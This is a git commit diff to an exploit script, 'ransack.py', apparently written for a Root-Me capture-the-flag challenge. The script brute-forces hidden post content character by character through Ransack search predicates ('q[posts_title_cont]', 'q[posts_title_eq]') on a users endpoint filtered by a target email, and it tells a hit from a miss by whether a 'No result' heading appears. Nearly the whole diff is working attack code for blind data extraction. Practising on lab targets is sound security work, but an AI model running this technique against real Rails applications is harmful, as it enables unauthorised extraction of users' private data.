f5e73fc6b3ccd7f38ccb89adb4fbebcf38e047e1
Nathan Bole-Richard <133039461+IAidenI@users.noreply.github.com>
2026-04-05 20:12:44 +0200

    Refactor sendPayload to accept a key parameter

--- ransack.py
+++ ransack.py
@@ -11,11 +11,11 @@ class Ransack:
     def setTarget(self, target):
         self.target = target
 
-    def sendPayload(self, payload):
+    def sendPayload(self, key, payload):
         params = {
             "utf8": "✓",
             "q[email_cont]": self.target,
-            "q[posts_content_start]": payload
+            f"q[{key}]": payload
         }
         r = requests.get(self.url, params=params, allow_redirects=False)
         pattern = r"<h2>\s*No result\s*</h2>"
@@ -27,27 +27,20 @@ class Ransack:
             return
 
         charset = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*"
-
-        if not self.sendPayload("a"):
-            print("Invalide")
-        else:
-            print("Valide")
-
-"""
+        
         payload = ""
         i = 0
-        while i < 10:
+        while not self.sendPayload("posts_title_eq", payload):
             for c in charset:
                 payload += c
                 print(f"[ ] Attempting '{payload}'")
-                if not self.sendPayload(payload):
+                if not self.sendPayload("posts_title_cont", payload):
                     payload = payload[:-1]
-                    print("[-] Nope restaure to", payload)
                 i += 1
-        return payload"""
+        return payload
 
 url     = "http://challenge01.root-me.org:59097/users"
-target  = "gwittfeld@example.com"
+target  = "aborsig@example.com"
 exploit = Ransack(url)
 exploit.setTarget(target)
 print("[+] Start searching...")
